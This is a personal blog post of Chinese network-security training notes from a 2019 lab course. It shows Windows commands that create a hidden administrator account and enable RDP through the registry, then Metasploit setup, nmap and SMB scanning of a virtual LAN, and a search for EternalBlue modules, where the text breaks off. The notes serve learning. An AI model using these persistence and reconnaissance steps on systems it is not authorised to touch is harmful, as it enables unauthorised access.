<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="What could be more exciting than proving yourself?">
  <meta name="author" content="Fangmuheng">
  <meta name="keywords" content="Blog">
  <title>实训笔记-19年暑假前 - 方慕珩</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.18.1/styles/github-gist.min.css">


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_fmb4a04yx8h.css">

<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_ijqayz9ro8k.css">



<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>方慕珩</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">
              <i class="iconfont icon-home-fill"></i>
              首页</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">
              <i class="iconfont icon-archive-fill"></i>
              归档</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/categories/">
              <i class="iconfont icon-category-fill"></i>
              分类</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">
              <i class="iconfont icon-tags-fill"></i>
              标签</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">
              <i class="iconfont icon-user-fill"></i>
              关于</a>
          </li>
        
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">
              <i class="iconfont icon-link-fill"></i>
              友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/1.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <div class="mt-3 post-meta">
                  <i class="iconfont icon-date-fill" aria-hidden="true"></i>
                  <time datetime="2019-07-07 15:55">
                    星期日, 七月 7日 2019, 3:55 下午
                  </time>
                </div>
              

              <div class="mt-1">
                
                  
                  <span class="post-meta mr-2">
                    <i class="iconfont icon-chart"></i>
                    5.3k 字
                  </span>
                

                
                  
                  <span class="post-meta mr-2">
                      <i class="iconfont icon-clock-fill"></i>
                    
                    
                    89
                     分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="iconfont icon-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </div>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <div class="post-content mx-auto" id="post">
            
            <article class="markdown-body">
              <p>暑期实习（培训）笔记，网安相关。</p>
<a id="more"></a>
<h2 id="2019-7-6"><a href="#2019-7-6" class="headerlink" title="2019/7/6"></a>2019/7/6</h2><p>上午：安装VMware</p>
<p>下午：介绍操作系统，安装虚拟机windows和linux</p>
<h2 id="2019-7-7"><a href="#2019-7-7" class="headerlink" title="2019/7/7"></a>2019/7/7</h2><p><strong>物理地址</strong>全国唯一，IPv4地址是自己的。</p>
<h3 id="windows命令："><a href="#windows命令：" class="headerlink" title="windows命令："></a>windows命令：</h3><h4 id="1-查看ip地址："><a href="#1-查看ip地址：" class="headerlink" title="1.查看ip地址："></a>1.查看ip地址：</h4><pre><code class="hljs undefined">ipconfig</code></pre>
<h5 id="更全的包括物理地址："><a href="#更全的包括物理地址：" class="headerlink" title="更全的包括物理地址："></a>更全的包括物理地址：</h5><pre><code class="hljs undefined">ipconfig /all</code></pre>
<h5 id="网络状态"><a href="#网络状态" class="headerlink" title="网络状态"></a>网络状态</h5><pre><code class="hljs undefined">netstat -a</code></pre>
<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><pre><code class="hljs undefined">// 查看有哪些用户 
net user</code></pre>
<pre><code class="hljs undefined">// 加一个heibai的用户密码为lovechina 
net user sms2056 lovechina /add</code></pre>
<pre><code class="hljs undefined">// 把他加入Administrator组 
net localgroup Administrators sms2056 /add</code></pre>
<h4 id="3-打开端口"><a href="#3-打开端口" class="headerlink" title="3.打开端口"></a>3.打开端口</h4><pre><code class="hljs undefined">//方法一
// 开启3389 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

//方法二
wmic RDTOGGLE WHERE ServerName=&apos;%COMPUTERNAME%&apos; call SetAllowTSConnections 1

//方法三
//直接写成BAT文件
echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg regedit /s 3389.reg del 3389.reg</code></pre>
<h3 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h3><h4 id="查看ip地址："><a href="#查看ip地址：" class="headerlink" title="查看ip地址："></a>查看ip地址：</h4><pre><code class="hljs undefined">root@qzz:~# ifconfig
eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.92.131  netmask 255.255.255.0  broadcast 192.168.92.255
        inet6 fe80::20c:29ff:fe0e:c39b  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 00:0c:29:0e:c3:9b  txqueuelen 1000  (Ethernet)
        RX packets 33  bytes 2956 (2.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 2060 (2.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 10  bytes 456 (456.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10  bytes 456 (456.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</code></pre>
<p> Linux系统的ping命令是常用的网络命令，它通常用来测试与目标主机的连通性。</p>
<p>（详见：<a href="https://www.cnblogs.com/ftl1012/p/ping.html）" target="_blank" rel="noopener">https://www.cnblogs.com/ftl1012/p/ping.html）</a></p>
<p>（最后按Ctrl-C停止）</p>
<pre><code class="hljs undefined">root@qzz:~# ping 主机ip地址
PING 主机ip地址 56(84) bytes of data.
64 bytes from 主机ip地址: icmp_seq=1 ttl=64 time=0.022 ms
64 bytes from 主机ip地址: icmp_seq=2 ttl=64 time=0.077 ms</code></pre>
<p><code>ls</code>命令：显示当前目录下的文件列表</p>
<pre><code class="hljs undefined">root@qzz:~# ls /
0    boot  etc   initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
bin  dev   home  initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz</code></pre>
<pre><code class="hljs undefined">//ls /-l显示出的是当前路径下文件列表的详细信息，包括以“.”开头的隐藏文件。

root@qzz:~# ls / -l
总用量 68
-rw-r--r--   1 root root     0 3月   1 03:16 0
lrwxrwxrwx   1 root root     7 7月   6 11:18 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 7月   6 16:35 boot
drwxr-xr-x  17 root root  3320 7月   7 13:43 dev
drwxr-xr-x 178 root root 12288 7月   7 13:43 etc
drwxr-xr-x   2 root root  4096 11月 29  2018 home
lrwxrwxrwx   1 root root    34 7月   6 11:18 initrd.img -&gt; boot/initrd.img-4.19.0-kali3-amd64
lrwxrwxrwx   1 root root    34 7月   6 11:18 initrd.img.old -&gt; boot/initrd.img-4.19.0-kali3-amd64
lrwxrwxrwx   1 root root     7 7月   6 11:18 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 7月   6 11:18 lib32 -&gt; usr/lib32</code></pre>
<p><code>pwd</code>：查看当前所在路径</p>
<pre><code class="hljs undefined">root@qzz:/# pwd
/</code></pre>
<p><code>cd ..</code>：返回上一级</p>
<p><code>cd /</code>：去那个路径</p>
<h4 id="Metasploit配置"><a href="#Metasploit配置" class="headerlink" title="Metasploit配置"></a>Metasploit配置</h4><p>（开源的安全漏洞检测工具）</p>
<h5 id="0-查看状态"><a href="#0-查看状态" class="headerlink" title="0.查看状态"></a>0.查看状态</h5><pre><code class="hljs undefined">root@qzz:/# service postgresql status
● postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
   Active: inactive (dead)
//是关着的</code></pre>
<h5 id="1-启动动PostgreSQL服务"><a href="#1-启动动PostgreSQL服务" class="headerlink" title="1.启动动PostgreSQL服务"></a>1.启动动PostgreSQL服务</h5><p>为Metasploit 使用PostgreSQL作为数据库，所以必须先启PostgreSQL服务。</p>
<pre><code class="hljs undefined">service postgresql start 
// 或 
systemctl status postgresql</code></pre>
<pre><code class="hljs undefined">//启动以后
root@qzz:/# service postgresql status
● postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disabled)
   Active: active (exited) since Sun 2019-07-07 13:51:54 CST; 2s ago
  Process: 4076 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
 Main PID: 4076 (code=exited, status=0/SUCCESS)

7月 07 13:51:54 qzz systemd[1]: Starting PostgreSQL RDBMS...
7月 07 13:51:54 qzz systemd[1]: Started PostgreSQL RDBMS.</code></pre>
<p>执行成功后，可以通过 ss -ant 命令查看端口5432是否在侦听，去验证PostgreSQL服务是否成功开启。</p>
<pre><code class="hljs undefined">root@qzz:/# ss -ant
State               Recv-Q              Send-Q                           Local Address:Port                            Peer Address:Port              
LISTEN              0                   128                                  127.0.0.1:5432                                 0.0.0.0:*                 
LISTEN              0                   128                                      [::1]:5432                                    [::]:*</code></pre>
<h5 id="2-初始化Metasploit数据库"><a href="#2-初始化Metasploit数据库" class="headerlink" title="2.初始化Metasploit数据库"></a>2.初始化Metasploit数据库</h5><p><code>root@qzz:/# msfdb init</code>命令‘初始化</p>
<pre><code class="hljs undefined">root@qzz:/# msfdb init
[i] Database already started
[+] Creating database user &apos;msf&apos;
为新角色输入的口令: 
再输入一遍: 
[+] Creating databases &apos;msf&apos;
[+] Creating databases &apos;msf_test&apos;
[+] Creating configuration file &apos;/usr/share/metasploit-framework/config/database.yml&apos;
[+] Creating initial database schema</code></pre>
<h5 id="3-启动Metasploit"><a href="#3-启动Metasploit" class="headerlink" title="3.启动Metasploit"></a>3.启动Metasploit</h5><pre><code class="hljs undefined">msfdb run 
// 或 
msfconsole</code></pre>
<pre><code class="hljs undefined">root@qzz:/# msfdb run
[i] Database already started
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;&apos; /
                         `.  ,&apos;/ .&apos;
                          `. X /.&apos;
                .-;--&apos;&apos;--.._` ` (
              .&apos;            /   `
             ,           ` &apos;   Q &apos;
             ,         ,   `._    \
          ,.|         &apos;     `-.;_&apos;
          :  . `  ;    `  ` --,.._;
           &apos; `    ,   )   .&apos;
              `._ ,  &apos;   /_
                 ; ,&apos;&apos;-,;&apos; ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v5.0.2-dev                           ]
+ -- --=[ 1852 exploits - 1046 auxiliary - 325 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]
+ -- --=[ ** This is Metasploit 5 development branch **   ]</code></pre>
<pre><code class="hljs undefined">//db_status验证数据库是否与MSF对联
msf5 &gt; db_status
[*] Connected to msf. Connection type: postgresql.</code></pre>
<h5 id="4-构建模块缓存"><a href="#4-构建模块缓存" class="headerlink" title="4.构建模块缓存"></a>4.构建模块缓存</h5><pre><code class="hljs undefined">msf5 &gt; db_rebuild_cache
[*] Purging and rebuilding the module cache in the background...</code></pre>
<h5 id="5-测试缓存是否可用"><a href="#5-测试缓存是否可用" class="headerlink" title="5.测试缓存是否可用"></a>5.测试缓存是否可用</h5><p>以 <code>ms08-067</code> 为例</p>
<pre><code class="hljs undefined">msf5 &gt; search ms08-067

Matching Modules
================

   Name                                 Disclosure Date  Rank   Check  Description
   ----                                 ---------------  ----   -----  -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption</code></pre>
<blockquote>
<p>ms08-067是一个漏洞，服务器服务中的漏洞可能允许远程执行代码</p>
<p>如果用户在受影响的系统上收到特制的 RPC 请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，攻击者可能未经身份验证即可利用此漏洞运行任意代码。 此漏洞可能用于进行蠕虫攻击。 </p>
</blockquote>
<h5 id="6-开机自启"><a href="#6-开机自启" class="headerlink" title="6.开机自启"></a>6.开机自启</h5><p>重新打开一个终端。</p>
<pre><code class="hljs undefined">update-rc.d postgresql enable</code></pre>
<h4 id="Metasploit信息收集"><a href="#Metasploit信息收集" class="headerlink" title="Metasploit信息收集"></a>Metasploit信息收集</h4><h5 id="1-启动MSF"><a href="#1-启动MSF" class="headerlink" title="1.启动MSF"></a>1.启动MSF</h5><pre><code class="hljs undefined">root@qzz:~# msfdb run
[i] Database already started
                                                  

                 _---------.
             .&apos; #######   ;.&quot;
  .---,.    ;@             @@`;   .---,..
.&quot; @@@@@&apos;.,&apos;@@            @@@@@&apos;,.&apos;@@@@ &quot;.
&apos;-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .&apos;
     &quot;--&apos;.@@@  -.@        @ ,&apos;-   .&apos;--&quot;
          &quot;.@&apos; ; @       @ `.  ;&apos;
            |@@@@ @@@     @    .
             &apos; @@@ @@   @@    ,
              `.@@@@    @@   .
                &apos;,@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@&apos;. __*__,.&quot;    \|--- \_____________/
                  &apos;(.,....&quot;/


       =[ metasploit v5.0.2-dev                           ]
+ -- --=[ 1852 exploits - 1046 auxiliary - 325 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]
+ -- --=[ ** This is Metasploit 5 development branch **   ]</code></pre>
<p>检查状态：</p>
<pre><code class="hljs undefined">msf5 &gt; db_status
[*] Connected to msf. Connection type: postgresql.</code></pre>
<p>检查当前的工作站：（default是系统自带）</p>
<pre><code class="hljs undefined">msf5 &gt; workspace 
* default</code></pre>
<p>创建一个新的工作站：</p>
<pre><code class="hljs undefined">msf5 &gt; workspace -a newwork
[*] Added workspace: newwork
[*] Workspace: newwork</code></pre>
<p>每次创建一个新的，就会自动使用你创建的那个新的工作站，如果想要制定使用哪个工作站，可以使用<code>workspace 工作站名</code>来更改。</p>
<p>删除一个工作站：</p>
<pre><code class="hljs undefined">msf5 &gt; workspace -d gongzuozhan
[*] Deleted workspace: gongzuozhan</code></pre>
<h5 id="2-主机发现"><a href="#2-主机发现" class="headerlink" title="2.主机发现"></a>2.主机发现</h5><p>扫描当前网段：</p>
<p>其中：-v是输出详细的信息，-sV是进行版本探测。 </p>
<p>（详见：<a href="https://www.cnblogs.com/chia/p/9040805.html）" target="_blank" rel="noopener">https://www.cnblogs.com/chia/p/9040805.html）</a></p>
<pre><code class="hljs undefined">msf5 &gt; nmap -v -sV 主机ip地址/24 -oA 192_
[*] exec: nmap -v -sV 主机ip地址/24 -oA 192_

Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-07 14:10 CST
NSE: Loaded 43 scripts for scanning.
Initiating ARP Ping Scan at 14:10
Scanning 255 hosts [1 port/host]
Completed ARP Ping Scan at 14:10, 1.98s elapsed (255 total hosts)
Initiating Parallel DNS resolution of 255 hosts. at 14:10
Completed Parallel DNS resolution of 255 hosts. at 14:10, 0.07s elapsed</code></pre>
<p>扫描出的端口：（上一步的内容</p>
<pre><code class="hljs undefined">Host is up (0.00083s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE        VERSION
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server?
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49155/tcp open  msrpc          Microsoft Windows RPC
49156/tcp open  msrpc          Microsoft Windows RPC</code></pre>
<p>其中有一个445端口。</p>
<blockquote>
<p>445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种<strong>共享文件夹或共享打印机</strong>，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！2017年10月，由于病毒“坏兔子”来袭，国家互联网应急中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口。</p>
</blockquote>
<p>（关于端口和一个实例参考：<a href="https://blog.csdn.net/wxl2012/article/details/5383321）" target="_blank" rel="noopener">https://blog.csdn.net/wxl2012/article/details/5383321）</a></p>
<p>查看生成好的文件：</p>
<pre><code class="hljs undefined">msf5 &gt; ls -l
[*] exec: ls -l

总用量 112
-rw-r--r-- 1 root root 14412 7月   7 15:17 192_.gnmap
-rw-r--r-- 1 root root 15767 7月   7 15:17 192_.nmap
-rw-r--r-- 1 root root 43207 7月   7 15:17 192_.xml
drwxr-xr-x 2 root root  4096 7月   6 12:59 公共
drwxr-xr-x 2 root root  4096 7月   6 12:59 模板
drwxr-xr-x 2 root root  4096 7月   6 12:59 视频
drwxr-xr-x 2 root root  4096 7月   6 12:59 图片
drwxr-xr-x 2 root root  4096 7月   6 12:59 文档
drwxr-xr-x 2 root root  4096 7月   6 12:59 下载
drwxr-xr-x 2 root root  4096 7月   6 12:59 音乐
drwxr-xr-x 4 root root  4096 7月   6 16:35 桌面
drwxr-xr-x 2 root root  4096 7月   6 15:05 a</code></pre>
<p>将结果导入到你创建的那个workspace：</p>
<pre><code class="hljs undefined">msf5 &gt; db_import 192_.xml
[*] Importing &apos;Nmap XML&apos; data
[*] Import: Parsing with &apos;Nokogiri v1.10.1&apos;
[*] Importing host 192.168.92.1
[*] Importing host 192.168.92.2
[*] Importing host 192.168.92.130
[*] Importing host 192.168.92.254
[*] Importing host 
[*] Successfully imported /root/192_.xml</code></pre>
<p>显示导入结果：</p>
<pre><code class="hljs undefined">msf5 &gt; hosts

Hosts
=====

address         mac                name   os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----   -------  ---------  -----  -------  ----  --------
192.168.92.1    00:50:56:c0:00:08  bogon  Unknown                    device         
192.168.92.2    00:50:56:f6:39:4b  bogon  Unknown                    device         
192.168.92.130  00:0c:29:ba:ab:08  bogon  Unknown                    device         
//自己的主机ip地址//                     bogon  Unknown                    device         
192.168.92.254  00:50:56:e9:af:8c  bogon  Unknown                    device</code></pre>
<p>其中我们看到有一个是自己的ip，这个就不用扫描，我们可以把它删除掉。</p>
<pre><code class="hljs undefined">msf5 &gt; hosts -d 你要删除掉的

Hosts
=====

address         mac  name   os_name  os_flavor  os_sp  purpose  info  comments
-------         ---  ----   -------  ---------  -----  -------  ----  --------
                   bogon  Unknown                    device         

[*] Deleted 1 hosts</code></pre>
<h5 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h5><p>搜索Metasploit中的端口扫描器：</p>
<pre><code class="hljs undefined">msf5 &gt; search portscan

Matching Modules
================

   Name                                              Disclosure Date  Rank    Check  Description
   ----                                              ---------------  ----    -----  -----------
   auxiliary/scanner/http/wordpress_pingback_access                   normal  Yes    Wordpress Pingback Locator
   auxiliary/scanner/natpmp/natpmp_portscan                           normal  Yes    NAT-PMP External Port Scanner
   auxiliary/scanner/portscan/ack                                     normal  Yes    TCP ACK Firewall Scanner
   auxiliary/scanner/portscan/ftpbounce                               normal  Yes    FTP Bounce Port Scanner
   auxiliary/scanner/portscan/syn                                     normal  Yes    TCP SYN Port Scanner
   auxiliary/scanner/portscan/tcp                                     normal  Yes    TCP Port Scanner
   auxiliary/scanner/portscan/xmas                                    normal  Yes    TCP &quot;XMas&quot; Port Scanner
   auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner</code></pre>
<p>我们可以看到有很多的扫描工具，我们使用<code>auxiliary/scanner/portscan/syn</code>来扫描。</p>
<pre><code class="hljs undefined">msf5 &gt; use auxiliary/scanner/portscan/syn
msf5 auxiliary(scanner/portscan/syn) &gt;</code></pre>
<p>可以看到前缀已经修改。</p>
<p>显示配置项：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/portscan/syn) &gt; show options

Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   DELAY      0                yes       The delay between connections, per thread, in milliseconds
   INTERFACE                   no        The name of the interface
   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                      yes       The target address range or CIDR identifier
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds</code></pre>
<p>导入扫描目标：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/portscan/syn) &gt; hosts -R

Hosts
=====

address         mac                name   os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----   -------  ---------  -----  -------  ----  --------
192.168.92.1    00:50:56:c0:00:08  bogon  Unknown                    device         
192.168.92.2    00:50:56:f6:39:4b  bogon  Unknown                    device         
192.168.92.130  00:0c:29:ba:ab:08  bogon  Unknown                    device         
192.168.92.254  00:50:56:e9:af:8c  bogon  Unknown                    device         

RHOSTS =&gt; 192.168.92.1 192.168.92.2 192.168.92.130 192.168.92.254</code></pre>
<p>再次<code>show options</code>我们就可以看到导入成功了。</p>
<p>（在<code>RHOSTS</code>这一行）</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/portscan/syn) &gt; show options

Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting                                          Required  Description
   ----       ---------------                                          --------  -----------
   BATCHSIZE  256                                                      yes       The number of hosts to scan per set
   DELAY      0                                                        yes       The delay between connections, per thread, in milliseconds
   INTERFACE                                                           no        The name of the interface
   JITTER     0                                                        yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-10000                                                  yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS     192.168.92.1 192.168.92.2 192.168.92.130 192.168.92.254  yes       The target address range or CIDR identifier
   SNAPLEN    65535                                                    yes       The number of bytes to capture
   THREADS    1                                                        yes       The number of concurrent threads
   TIMEOUT    500                                                      yes       The reply read timeout in milliseconds</code></pre>
<p>设置扫描端口,只扫描445端口 ：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/portscan/syn) &gt; set PORTS 445
PORTS =&gt; 445</code></pre>
<p>开始运行扫描器：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/portscan/syn) &gt; run

[+]  TCP OPEN 192.168.92.1:445
[+]  TCP OPEN 192.168.92.130:445
[*] Scanned 4 of 4 hosts (100% complete)
[*] Auxiliary module execution completed</code></pre>
<h5 id="4-SMB版本扫描"><a href="#4-SMB版本扫描" class="headerlink" title="4.SMB版本扫描"></a>4.SMB版本扫描</h5><p>搜索：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/portscan/syn) &gt; search smb_version

Matching Modules
================

   Name                               Disclosure Date  Rank    Check  Description
   ----                               ---------------  ----    -----  -----------
   auxiliary/scanner/smb/smb_version                   normal  Yes    SMB Version Detection</code></pre>
<p>切换：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/portscan/syn) &gt; use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) &gt; search smb_version</code></pre>
<p>导入：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/smb/smb_version) &gt; hosts -R

Hosts
=====

address         mac                name   os_name  os_flavor  os_sp  purpose  info  comments
-------         ---                ----   -------  ---------  -----  -------  ----  --------
192.168.92.1    00:50:56:c0:00:08  bogon  Unknown                    device         
192.168.92.2    00:50:56:f6:39:4b  bogon  Unknown                    device         
192.168.92.130  00:0c:29:ba:ab:08  bogon  Unknown                    device         
192.168.92.254  00:50:56:e9:af:8c  bogon  Unknown                    device         

RHOSTS =&gt; 192.168.92.1 192.168.92.2 192.168.92.130 192.168.92.254</code></pre>
<p>运行：</p>
<pre><code class="hljs undefined">msf5 auxiliary(scanner/smb/smb_version) &gt; run

[*] 192.168.92.1:445      - Host could not be identified:  ()
[*] Scanned 1 of 4 hosts (25% complete)
[*] Scanned 2 of 4 hosts (50% complete)
[+] 192.168.92.130:445    - Host is running Windows 2008 R2 Enterprise SP1 (build:7601) (name:WIN-PA5UULAVJOQ) (workgroup:WORKGROUP )
[*] Scanned 3 of 4 hosts (75% complete)
[*] Scanned 4 of 4 hosts (100% complete)
[*] Auxiliary module execution completed</code></pre>
<p>显示扫描过程中的服务信息：</p>
<pre><code class="hljs undefined">//先返回
msf5 auxiliary(scanner/smb/smb_version) &gt; back
msf5 &gt; 
//显示
msf5 &gt; services
Services
========

host            port   proto  name             state  info
----            ----   -----  ----             -----  ----
192.168.92.1    135    tcp    msrpc            open   Microsoft Windows RPC
192.168.92.1    139    tcp    netbios-ssn      open   Microsoft Windows netbios-ssn
192.168.92.1    445    tcp    smb              open    ()
192.168.92.1    8082   tcp    blackice-alerts  open   
192.168.92.2    53     tcp    domain           open   unknown banner: hrb dns
192.168.92.130  135    tcp    msrpc            open   Microsoft Windows RPC
192.168.92.130  139    tcp    netbios-ssn      open   Microsoft Windows netbios-ssn
192.168.92.130  445    tcp    smb              open   Windows 2008 R2 Enterprise SP1 (build:7601) (name:WIN-PA5UULAVJOQ) (workgroup:WORKGROUP )
192.168.92.130  3389   tcp    ms-wbt-server    open   Microsoft Terminal Service
192.168.92.130  49152  tcp    msrpc            open   Microsoft Windows RPC
192.168.92.130  49153  tcp    msrpc            open   Microsoft Windows RPC
192.168.92.130  49154  tcp    msrpc            open   Microsoft Windows RPC
192.168.92.130  49155  tcp    msrpc            open   Microsoft Windows RPC
192.168.92.130  49156  tcp    msrpc            open   Microsoft Windows RPC</code></pre>
<h4 id="Metasploit永恒之蓝漏洞利用"><a href="#Metasploit永恒之蓝漏洞利用" class="headerlink" title="Metasploit永恒之蓝漏洞利用"></a>Metasploit永恒之蓝漏洞利用</h4><h5 id="1-搜索相关漏洞"><a href="#1-搜索相关漏洞" class="headerlink" title="1.搜索相关漏洞"></a>1.搜索相关漏洞</h5><pre><code class="hljs undefined">msf5 &gt; search 17-010

Matching Modules
================

   Name                                           Disclosure Date  Rank     Check  Description
   ----                                           ---------------  ----     -----  -----------
   auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   auxiliary/scanner/smb/smb_ms17_010                              normal   Yes    MS17-010 SMB RCE Detection
   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
